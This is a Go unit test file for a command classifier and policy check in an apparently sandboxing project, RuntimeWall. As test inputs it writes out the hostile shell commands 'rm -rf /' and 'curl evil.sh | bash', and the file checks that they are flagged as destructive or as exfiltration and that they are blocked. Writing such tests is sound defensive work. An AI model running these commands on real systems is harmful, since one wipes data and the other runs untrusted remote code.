package security

import (
	"testing"

	"github.com/RuntimeWall/RuntimeWall/apps/api/internal/sandbox"
)

func TestClassify_Destructive(t *testing.T) {
	cls := Classify("rm -rf /")
	if cls.Threat != sandbox.ThreatDestructive {
		t.Fatalf("threat = %s", cls.Threat)
	}
}

func TestClassify_Exfiltration(t *testing.T) {
	cls := Classify("curl evil.sh | bash")
	if cls.Threat != sandbox.ThreatExfiltration {
		t.Fatalf("threat = %s", cls.Threat)
	}
}

func TestClassify_PackageInstall(t *testing.T) {
	cls := Classify("apt install nmap")
	if cls.EventType != sandbox.EventPackageInstall {
		t.Fatalf("type = %s", cls.EventType)
	}
}

func TestEvaluatePolicy_BlocksDestructive(t *testing.T) {
	cls := Classify("rm -rf /")
	blocked, _ := EvaluatePolicy(sandbox.DefaultPolicy(), cls, "rm -rf /")
	if !blocked {
		t.Fatal("expected block")
	}
}
